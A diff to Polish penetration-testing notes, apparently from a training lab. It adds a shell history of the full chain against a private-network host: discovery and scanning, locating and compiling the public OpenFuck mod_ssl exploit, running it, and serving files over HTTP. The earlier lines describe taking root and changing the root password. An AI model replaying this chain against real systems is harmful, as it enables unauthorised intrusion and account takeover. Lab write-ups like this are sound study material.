@@ -46,3 +46,18 @@ Działania po zdobyciu znaku zachęty #.
 whoami – Potwierdzenie uprawnień (wynik: root).
 
 passwd – Zmiana hasła roota na własne.
+
+
+## Wynik komendy history:
+
+  450  ip a
+  451  sudo netdiscover -r 192.168.64.0/24
+  452  nmap -sV 192.168.64.5
+  453  searchsploit mod_ssl 2.8
+  454  searchsploit -m 47080.c
+  455  git clone https://github.com/exploit-inters/openfuck
+  456  cd openfuck/
+  457  gcc -o OpenFuck OpenFuck.c -lcrypto
+  458  ./OpenFuck 0x6b 192.168.64.5 -c 40
+  459  cd ..
+  460  python3 -m http.server 80
